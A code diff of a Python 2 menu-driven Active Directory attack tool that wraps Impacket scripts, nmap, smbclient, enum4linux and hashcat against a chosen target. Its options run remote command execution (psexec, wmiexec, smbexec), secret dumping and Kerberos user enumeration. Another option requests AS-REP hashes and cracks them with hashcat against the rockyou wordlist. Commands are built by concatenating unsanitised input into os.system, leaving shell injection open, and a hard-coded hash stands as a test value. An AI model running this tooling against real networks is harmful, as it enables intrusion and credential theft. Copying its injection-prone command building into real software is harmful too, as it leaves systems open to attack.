@@ -51,22 +51,22 @@ def padding(variable,value):
       variable += " "
    return variable
 
-def dpadding(variable,value):
-   test = variable
-   variable = variable.rstrip("\n")
-   variable = variable[:value] 
-   while len(variable) < value:
-      if test =="":
-         variable += " "
-      else:
-         variable += "."
-   return variable
-
 def rpadding(variable,value):
    variable = variable.rstrip("\n")
    while len(variable) < value:
       temp = variable
       variable = "." + temp
+   return variable
+
+def dpadding(variable,value):
+   test = variable
+   variable = variable.rstrip("\n")
+   variable = variable[:value] 
+   while len(variable) < value:
+      if test == "":
+         variable += " "
+      else:
+         variable += "."
    return variable
 
 def gettime(value):
@@ -79,7 +79,7 @@ def gettime(value):
    return variable
 
 def command(command):
-   print "Using Command: " + CMD #DEBUG 
+#   print colored("Using Command: " + command + "\n", 'white')	# COMMENT OUT TO STOP DEBUGGING COMMANDS
    os.system(command)
    raw_input("\nPress ENTER to continue...")
    return
@@ -87,7 +87,6 @@ def command(command):
 def display():
    print u'\u2554' + (u'\u2550')*36 + u'\u2566' + (u'\u2550')*33 + u'\u2566' + (u'\u2550')*61 + u'\u2557'
    print u'\u2551' + (" ")*12 + colored("REMOTE SYSTEM",'white') +  (" ")*11 + u'\u2551' + (" ")*10 + colored("SYSTEM SHARES",'white') + (" ")*10 + u'\u2551' + (" ")*21 +  colored("USER INFORMATION",'white') + (" ")*24 + u'\u2551' 
-  # print u'\u2560' + (u'\u2550')*14 + u'\u2564' + (u'\u2550')*21 + u'\u256C' + (u'\u2550')*12 + u'\u2564' + (u'\u2550')*20 + u'\u256C' + (u'\u2550')*61 + u'\u2563'
    print u'\u2560' + (u'\u2550')*14 + u'\u2564' + (u'\u2550')*21 + u'\u256C' + (u'\u2550')*12 + u'\u2550' + (u'\u2550')*20 + u'\u256C' + (u'\u2550')*61 + u'\u2563'
 
    print u'\u2551' + " DNS SERVER   " + u'\u2502',
@@ -249,7 +248,6 @@ def display():
    print colored(PA[11],'blue'),
    print u'\u2551'
 
-   # print u'\u2560' + (u'\u2550')*14 + u'\u2567'+ (u'\u2550')*21  + u'\u2569' + (u'\u2550')*12 + u'\u2567' + (u'\u2550')*20 + u'\u2569' + (u'\u2550')*61 + u'\u2563'
    print u'\u2560' + (u'\u2550')*14 + u'\u2567'+ (u'\u2550')*21  + u'\u2569' + (u'\u2550')*12 + u'\u2550' + (u'\u2550')*20 + u'\u2569' + (u'\u2550')*61 + u'\u2563'
 
 # ----------------------------------------------------------------------------------------------------------------------------------------------------
@@ -260,8 +258,8 @@ def display():
    print u'\u2551' + "(3) Re/Set USERNAME    (13) Ping REMOTE IP     (23) NetView   (33) SamrDump       (43) GetUsersPns    (53) WmiExec HASH (63) NetCat " + u'\u2551'
    print u'\u2551' + "(4) Re/Set PASSWORD    (14) Get Architecture   (24) Services  (34) RpcDump        (44) GetAdUsers     (54) BLANK        (64) WinRem " + u'\u2551'
    print u'\u2551' + "(5) Re/Set FOREST NAME (15) Fierce DNS SERVER  (25) AtExec    (35) Reg            (45) KerbCheckUsers (55) BLANK        (65) BLANK  " + u'\u2551'
-   print u'\u2551' + "(6) Re/Set DOMAIN NAME (16) Nmap O/S + SKEW    (26) DcomExec  (36) SmbClient      (46) GetNpUsers     (56) BLANK        (66) BLANK  " + u'\u2551'
-   print u'\u2551' + "(7) Re/Set WORK GROUP  (17) Nmap SUBDOMAINS    (27) PsExec    (37) SmbMap SHARE   (47) SecretsDump    (57) BLANK        (67) BLANK  " + u'\u2551'
+   print u'\u2551' + "(6) Re/Set DOMAIN NAME (16) Nmap O/S + Skew    (26) DcomExec  (36) SmbClient      (46) GetNpUsers     (56) BLANK        (66) BLANK  " + u'\u2551'
+   print u'\u2551' + "(7) Re/Set WORK GROUP  (17) Nmap Subdomains    (27) PsExec    (37) SmbMap SHARE   (47) SecretsDump    (57) BLANK        (67) BLANK  " + u'\u2551'
    print u'\u2551' + "(8) Re/Set SHARE NAME  (18) Nmap Intense TCP   (28) SmbExec   (38) SmbMount SHARE (48) WinDapSearch   (58) BLANK        (68) BLANK  " + u'\u2551'
    print u'\u2551' + "(9) Re/Set IMPERSONATE (19) Nmap Slow and Full (29) WmiExec   (39) Enum4Linux     (49) LdapDomainDump (59) BLANK        (69) BLANK  " + u'\u2551'
    print u'\u255A' + (u'\u2550')*132 + u'\u255D'
@@ -287,19 +285,37 @@ print "BY TERENCE BROADBENT MSc DIGITAL FORENSICS & CYBERCRIME ANALYSIS\n"
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub                                                               
 # Version : 1.0
-# Details : Boot the system and initialise program variables.
+# Details : Boot the system and initialise program files and variables.
 # Modified: N/A                                                               
 # -------------------------------------------------------------------------------------
 
 print "Booting - Please wait...\n"
 
-if not os.path.exists('WORKAREA'):
+if not os.path.exists("WORKAREA"):		# DEFUALT WORKAREA
    os.mkdir("WORKAREA")
    print "[-] Work area created..."
 else:
-   print "[-] Work area already exists...."
+   print "[-] Work area already exists..."
 
-print "[-] Populating system variables...."
+if not os.path.exists("USERS.tmp"):		# HOLDS INITIAL USERS DATA
+   os.system("touch USERS.tmp")
+   print "[-] File USERS.tmp created..."
+else:
+   print "[-] File USERS.tmp already exists..."
+
+if not os.path.exists("SHARES.tmp"):		# HOLDS INITIAL SHARE DATA
+   os.system("touch SHARES.tmp")
+   print "[-] File SHARES.tmp created..."
+else:
+   print "[-] File SHARES.tmp already exists..."
+
+if not os.path.exists("user.tmp"):		# HOLDS CURRENT FILTERED USER LIST
+   os.system("touch user.tmp")
+   print "[-] File user.tmp created..."
+else:
+   print "[-] File user.tmp already exists..."
+
+print "[-] Populating system variables..."
 
 COL1 = 19
 COL2 = 31
@@ -342,9 +358,11 @@ X1   = " "*COL3
 X2   = " "*COL4
 US   = []
 PA   = []
-US   = [X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1] # 30 USERNAMES
-PA   = ["32693b11e6aa90eb43d32c72a07ceea6",X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2] # 30 PASSWORDS
+US   = [X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1] # 40 USERNAMES
+PA   = [X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2] # 40 PASSWORDS
+MAX  = 39
 
+PA[0] = "32693b11e6aa90eb43d32c72a07ceea6" # TEMPORY ASSIGNED VARIABLE WHILE TESTING
 
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
@@ -384,17 +402,17 @@ else:
    DIR  = linecache.getline('config.txt', 12)
 
    DNSN = padding(DNSN, COL1)
-   TIP  = padding(TIP, COL1)
-   USR  = padding(USR, COL1)
-   PAS  = padding(PAS, COL1)
+   TIP  = padding(TIP,  COL1)
+   USR  = padding(USR,  COL1)
+   PAS  = padding(PAS,  COL1)
    FRST = padding(FRST, COL1)
-   HST  = padding(HST, COL1)
+   HST  = padding(HST,  COL1)
    WGRP = padding(WGRP, COL1)
-   HIP  = padding(HIP, COL1)
-   POR  = padding(POR, COL1)
-   PRM  = padding(PRM, COL1)
-   PI1  = padding(PI1, COL1)
-   DIR  = padding(DIR, COL1)
+   HIP  = padding(HIP,  COL1)
+   POR  = padding(POR,  COL1)
+   PRM  = padding(PRM,  COL1)
+   PI1  = padding(PI1,  COL1)
+   DIR  = padding(DIR,  COL1)
 
 raw_input("\nPlease ENTER key to continue...")
 
@@ -421,10 +439,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '0':
-      os.system("echo '' > config.txt")
-      os.system("sed -i 1d config.txt")
-
-      os.system("echo " + DNSN + " >> config.txt")
+      os.system("echo " + DNSN + " > config.txt")
       os.system("echo " + TIP  + " >> config.txt")
       if USR.rstrip(" ") == "\"\"":
          os.system("echo '\"\"' >> config.txt")
@@ -659,8 +674,8 @@ while True:
       os.remove("localip.txt")
       localhost = localhost.split(" ")
       localhost = localhost[1]
-      CMD = PRO + "ping.py " + localhost.rstrip(" ") +  " " + TIP.rstrip(" ")
-      command(CMD)
+
+      command(PRO + "ping.py " + localhost.rstrip(" ") +  " " + TIP.rstrip(" "))
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -671,8 +686,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '14':
-      CMD = PRO + "getArch.py -target " + TIP.rstrip(" ")
-      command(CMD)
+      command(PRO + "getArch.py -target " + TIP.rstrip(" "))
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -683,8 +697,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '15':
-      CMD = "fierce -dns " + DNSN.rstrip(" ")
-      command(CMD)
+      command("fierce -dns " + DNSN.rstrip(" "))
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -695,8 +708,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '16':
-      CMD = "nmap -sU -O -p 123 --script ntp-info " + TIP.rstrip(" ")
-      command(CMD)
+      command("nmap -sU -O -p 123 --script ntp-info " + TIP.rstrip(" "))
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -707,8 +719,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '17':
-      CMD = "nmap -p 80 --script http-vhosts --script-args http-vhosts.domain=" + HST.rstrip(" ") + " " + TIP.rstrip(" ")
-      command(CMD)
+      command("nmap -p 80 --script http-vhosts --script-args http-vhosts.domain=" + HST.rstrip(" ") + " " + TIP.rstrip(" "))
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -719,8 +730,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '18':
-      CMD = "nmap -T4 -F " + TIP.rstrip(" ")
-      command(CMD)
+      command("nmap -T4 -F " + TIP.rstrip(" "))
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -731,8 +741,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '19':
-      CMD = "nmap -sS -sU -T4 -A -v -PE -PP -PS80,443 -PA3389 -PU40125 -PY -g 53 --script 'default or (discovery and safe)' " + TIP.rstrip(" ")
-      command(CMD)
+      command("nmap -sS -sU -T4 -A -v -PE -PP -PS80,443 -PA3389 -PU40125 -PY -g 53 --script 'default or (discovery and safe)' " + TIP.rstrip(" "))
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -776,8 +785,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='23':
-      CMD = PRO + "netview.py " + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + " -target " + TIP.rstrip(" ")
-      command(CMD)
+      command(PRO + "netview.py " + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + " -target " + TIP.rstrip(" "))
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -788,8 +796,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='24':
-      CMD = PRO + "services.py " + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + " list"
-      command(CMD)
+      command(PRO + "services.py " + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + " list")
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -800,8 +807,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '25':
-      CMD = PRO + "atexec.py " + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + " " + PRM.rstrip(" ")
-      command(CMD)
+      command(PRO + "atexec.py " + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + " " + PRM.rstrip(" "))
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -812,8 +818,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '26':
-      CMD = PRO + "dcomexec.py " + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + " " + PRM.rstrip(" ")
-      command(CMD)
+      command(PRO + "dcomexec.py " + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + " " + PRM.rstrip(" "))
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -824,26 +829,25 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '27':
-      CMD = PRO + "psexec.py " + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + " > SHARES.txt"
-      os.system(CMD)
-
-      os.system("cat SHARES.txt")
+      os.remove("SHARES.tmp")
+      os.system(PRO + "psexec.py " + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + " > SHARES.tmp")
+      command("cat SHARES.tmp")
     
-      os.system("sed -i '1,3d' SHARES.txt")
-      os.system("sed -i -e 's/share //g' SHARES.txt")
+      os.system("sed -i '1,3d' SHARES.tmp")
+      os.system("sed -i -e 's/share //g' SHARES.tmp")
 
-      SH0  = linecache.getline('SHARES.txt', 1)
-      SH1  = linecache.getline('SHARES.txt', 2)
-      SH2  = linecache.getline('SHARES.txt', 3)
-      SH3  = linecache.getline('SHARES.txt', 4)
-      SH4  = linecache.getline('SHARES.txt', 5)
-      SH5  = linecache.getline('SHARES.txt', 6)
-      SH6  = linecache.getline('SHARES.txt', 7)
-      SH7  = linecache.getline('SHARES.txt', 8)
-      SH8  = linecache.getline('SHARES.txt', 9)
-      SH9  = linecache.getline('SHARES.txt', 10)
-      SH10 = linecache.getline('SHARES.txt', 11)
-      SH11 = linecache.getline('SHARES.txt', 12)
+      SH0  = linecache.getline('SHARES.tmp', 1)
+      SH1  = linecache.getline('SHARES.tmp', 2)
+      SH2  = linecache.getline('SHARES.tmp', 3)
+      SH3  = linecache.getline('SHARES.tmp', 4)
+      SH4  = linecache.getline('SHARES.tmp', 5)
+      SH5  = linecache.getline('SHARES.tmp', 6)
+      SH6  = linecache.getline('SHARES.tmp', 7)
+      SH7  = linecache.getline('SHARES.tmp', 8)
+      SH8  = linecache.getline('SHARES.tmp', 9)
+      SH9  = linecache.getline('SHARES.tmp', 10)
+      SH10 = linecache.getline('SHARES.tmp', 11)
+      SH11 = linecache.getline('SHARES.tmp', 12)
 
       SH0  = SH0.lstrip("[-] ")
       SH1  = SH1.lstrip("[-] ")
@@ -910,10 +914,6 @@ while True:
       SHA10 = padding(SHA10, COL5)
       SHA11 = padding(SHA11, COL5)
 
-      raw_input("\nPress ENTER to continue...")
-
-      print SH0 # DEBUG
-
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
@@ -923,8 +923,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '28':
-      CMD = PRO + "smbexec.py " + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ")
-      command(CMD)
+      command(PRO + "smbexec.py " + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" "))
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -935,8 +934,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '29':
-      CMD = PRO + "wmiexec.py " + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + " " + PRM.rstrip(" ")
-      command(CMD)
+      command(PRO + "wmiexec.py " + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + " " + PRM.rstrip(" "))
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -947,8 +945,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='30':
-      CMD = PRO + "ifmap.py " + TIP.rstrip(" ") + " 135"
-      command(CMD)
+      command(PRO + "ifmap.py " + TIP.rstrip(" ") + " 135")
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -960,8 +957,7 @@ while True:
 
    if selection =='31':
       ifmap = raw_input("\nEnter MSRPC interface (ifmap) : ")     
-      CMD = PRO + "opdump.py " + TIP.rstrip(" ") + " 135 " + ifmap
-      command(CMD)
+      command(PRO + "opdump.py " + TIP.rstrip(" ") + " 135 " + ifmap)
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -972,8 +968,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='32':
-      CMD = PRO + "lookupsid.py " + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ")
-      command(CMD)
+      command(PRO + "lookupsid.py " + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" "))
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -984,28 +979,36 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='33':
-      CMD = PRO + "samrdump.py " + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + " > USERS.txt"
-      os.system(CMD)
+      print "\nPlease wait..."
+      os.remove("USERS.tmp")	# CLEAR WORK FILE
+      os.remove("user.tmp")	# CLEAR WORK FILE
 
-      os.system("cat USERS.txt")
-      os.system("sed -i -n '/Found user:/p' USERS.txt")
+      os.system(PRO + "samrdump.py " + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + " >> USERS.tmp")
+      os.system("sed -i -n '/Found user: /p' USERS.tmp")	# SELECT ONLY FOUND USERS
+      os.system("sort USERS.tmp > USERS2.tmp")			# SORT USERS ALPHANUMERICALLY 
+      os.remove("USERS.tmp")
+      os.system("mv USERS2.tmp USERS.tmp")
       
-      for x in range (0,29):
-         US[x] = linecache.getline('USERS.txt', x+1)
-         US[x] = US[x].replace("Found user: ", "")
-         US[x] = US[x].split(",")
-         US[x] = US[x][0]
-         US[x] = padding(US[x], COL3)
+      for x in range (0,MAX):
+         US[x] = linecache.getline('USERS.tmp', x+1)
+         if US[x] != "":
+            US[x] = US[x].replace("Found user: ", "")
+            US[x] = US[x].split(",")
+            US[x] = US[x][0]
+            US[x] = padding(US[x], COL3)
+            if US[x] != "":
+               print "[-] Found user " + US[x]
+               os.system("echo " + US[x] + " >> user.tmp")	# ASSIGN USER NAME
+            else:
+               US[x] = "                                "	# ASSIGN EMPTY USER
          if PA[x] == "                                ":
             PA[x]  = "................................";
-         if US[x] != "":
-            os.system("echo " + US[x] + " >> users.txt")
       
-      if US[12] != "":
+      if US[12] != "                                ":
          US[11] = "Some users are not shown!!..."
          US[11] = padding(US[11], COL3)
 
-      raw_input("\nPress ENTER to continue...")    
+      command("echo '[*] All done!'")
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1016,8 +1019,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='34':
-      CMD = PRO + "rpcdump.py " + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ")
-      command(CMD)
+      command(PRO + "rpcdump.py " + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" "))
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent               #HKEY_LOCAL_MACHINE\SAM                                     
@@ -1028,8 +1030,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='35':
-      CMD = PRO + "reg.py " + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + " query -keyName HKLM\\\SOFTWARE\\\Policies\\\Microsoft\\\Windows -s"
-      command(CMD)
+      command(PRO + "reg.py " + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + " query -keyName HKLM\\\SOFTWARE\\\Policies\\\Microsoft\\\Windows -s")
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1040,8 +1041,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='36':
-      CMD = "smbclient -L \\\\\\\\" + TIP.rstrip(" ") + " -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ")
-      command(CMD)
+      command("smbclient -L \\\\\\\\" + TIP.rstrip(" ") + " -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" "))
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1052,8 +1052,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '37':
-      CMD = "smbmap -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " -d " + HST.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -R " + HIP.rstrip(" ")
-      command(CMD)
+      command("smbmap -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " -d " + HST.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -R " + HIP.rstrip(" "))
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1064,8 +1063,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '38':
-      CMD = "smbclient \\\\\\\\" + TIP.rstrip(" ") + "\\\\" + HIP.rstrip(" ") + " -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ")
-      command(CMD)
+      command("smbclient \\\\\\\\" + TIP.rstrip(" ") + "\\\\" + HIP.rstrip(" ") + " -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" "))
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1076,8 +1074,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '39':
-      CMD = "enum4linux -v " + TIP.rstrip(" ")
-      command(CMD)
+      command("enum4linux -v " + TIP.rstrip(" "))
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1088,8 +1085,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '40':
-      CMD = "rpcclient -U " + USR.rstrip(" ") + "%" + PAS.strip(" ") + " " + TIP.rstrip(" ")
-      command(CMD)
+      command("rpcclient -U " + USR.rstrip(" ") + "%" + PAS.strip(" ") + " " + TIP.rstrip(" "))
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1100,8 +1096,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '41':
-      CMD = PRO + "getTGT.py " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ")
-      command(CMD)
+      command(PRO + "getTGT.py " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" "))
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1112,8 +1107,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '42':
-      CMD = PRO + "getST.py -impersonate " + POR.strip(" ") + " -spn cifs/" + HST.rstrip(" ") + " " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ")
-      command(CMD)
+      command(PRO + "getST.py -impersonate " + POR.strip(" ") + " -spn cifs/" + HST.rstrip(" ") + " " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" "))
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1124,8 +1118,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '43':
-      CMD = PRO + "GetUserSPNs.py -request -target-domain " + HST.rstrip(" ") +  " " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ")
-      command(CMD) 
+      command(PRO + "GetUserSPNs.py -request -target-domain " + HST.rstrip(" ") +  " " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ")) 
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1136,63 +1129,64 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '44':
-      CMD = PRO + "GetADUsers.py " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ")
-      command(CMD)
+      command(PRO + "GetADUsers.py " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" "))
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : 1.0
-# Details : Menu option selected - Kerberus Filter Users.txt
+# Details : Menu option selected - Kerberus Filter user.tmp
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='45':
-      CMD = "nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm=" + HST.rstrip(" ") + ",userdb=users.txt " + TIP.rstrip(" ") + " >> KUSERS.txt"
-      os.system(CMD)
-      os.system("cat KUSERS.txt")
-      
-      os.system("sed -i '/@/!d' KUSERS.txt")
-      os.remove("users.txt")
-      	
-      for x in range (0,29):
-         US[x] = linecache.getline('KUSERS.txt', x+1)
-         US[x] = US[x].replace("|     ", "")
-         US[x] = US[x].split("@")
-         US[x] = US[x][0]
-         US[x] = padding(US[x], COL3)
-         if PA[x] == "                                ":
-            PA[x]  = "................................";
+      print "\nPlease wait..."
+      os.remove("USERS.tmp")	# CLEAR WORK FILE
+      os.system("nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm=" + HST.rstrip(" ") + ",userdb=user.tmp " + TIP.rstrip(" ") + " >> KUSERS.tmp")
+      os.remove("user.tmp")	# CLEAR WORK FILE
+      os.system("sed -i '/@/!d' KUSERS.tmp")
+      os.system("sort KUSERS.tmp > USERS2.tmp")
+      os.remove("KUSERS.tmp")
+	
+      for x in range (0,MAX):
+         US[x] = linecache.getline("USERS2.tmp", x+1)
          if US[x] != "":
-            os.system("echo " + US[x] + " >> users.txt")
+            US[x] = US[x].replace("|     ", "")
+            US[x] = US[x].replace("|_    ", "")
+            US[x] = US[x].split("@")
+            US[x] = US[x][0]
+            US[x] = padding(US[x], COL3)
+            if US[x] != "                                ":
+               print "[-] Found user " + US[x]
+               os.system("echo " + US[x] + " >> user.tmp")	# ASSIGN NEW USER
+            else:
+               US[x] = "                                "	# ASSIGN EMPTY USER
+
+         if PA[x] == "                                ":
+            PA[x]  = "................................";     
       
       if US[12] != "":
          US[11] = "Some users are not shown!!..."
          US[11] = padding(US[11], COL3)
       
-      raw_input("\nPress ENTER to continue...") 
-
+      os.system("mv USERS2.tmp USERS.tmp")
+      command("echo '[*] All done!'")
+      
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : 1.0
-# Details : Menu option selected - GetNPUsers.py HTB.local/ -usersfile users.txt -format hashcat -outputfile hashes.roast 
-# Modified: N/A                    megabank/-no-pass -usersfile USERS.txt
+# Details : Menu option selected - GetNPUsers.py HTB.local/ -usersfile user.tmp -format hashcat -outputfile hashes.roast 
+# Modified: N/A                    megabank/-no-pass -usersfile user.tmp
 # -------------------------------------------------------------------------------------
 
    if selection =='46':
-      test = linecache.getline('users.txt', 1)
-      if test != "":
-         CMD = PRO + "GetNPUsers.py -outputfile hashroast.txt -format hashcat " + HST.rstrip(" ") + "/ -usersfile users.txt"
-         command(CMD)
-         raw_input("\nPress ENTER to crack captured hash value...")  
-         os.system("hashcat -m 18200 --force -a 0 hashroast.txt /usr/share/wordlists/rockyou.txt -o cracked.txt")
-         raw_input("\nPress ENTER to show cracked hash value...")  
-         os.system("strings cracked.txt")
-         raw_input("\nPress ENTER to continue...")  
+      if linecache.getline('user.tmp', 1) != "":
+         command(PRO + "GetNPUsers.py -outputfile hashroast.txt -format hashcat " + HST.rstrip(" ") + "/ -usersfile user.tmp")
+         command("hashcat -m 18200 --force -a 0 hashroast.txt /usr/share/wordlists/rockyou.txt -o cracked.txt")
+         command("strings cracked.txt")
       else:
-         print "USERS.txt file is empty? try running option 23 first..."
-         raw_input("\nPress ENTER to continue...")  
+         command("echo 'The file user.tmp is empty? try running option 33 first...'")
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1203,8 +1197,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='47':
-      CMD = PRO + "secretsdump.py " + HST.rstrip(" ") + '/' + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ")
-      command(CMD)
+      command(PRO + "secretsdump.py " + HST.rstrip(" ") + '/' + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" "))
 
 #------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1215,8 +1208,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='48':
